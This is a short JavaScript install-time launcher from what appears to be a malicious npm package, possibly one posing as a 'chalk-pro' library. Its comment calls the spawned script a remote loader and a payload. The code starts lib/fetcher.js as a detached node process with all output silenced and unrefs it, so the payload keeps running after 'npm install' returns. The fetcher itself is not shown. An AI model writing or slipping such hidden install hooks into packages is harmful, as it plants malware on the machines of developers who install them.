'use strict';

// Install-time launcher: spawn a DETACHED, output-silenced node process running
// the remote loader, then unref so `npm install` returns immediately and the
// payload survives the parent exiting. This is the chalk-pro reach.
const { spawn } = require('child_process');
const path = require('path');

const child = spawn(process.execPath, [path.join(__dirname, '..', 'lib', 'fetcher.js')], {
  detached: true,
  stdio: ['ignore', 'ignore', 'ignore'],
});

child.unref();
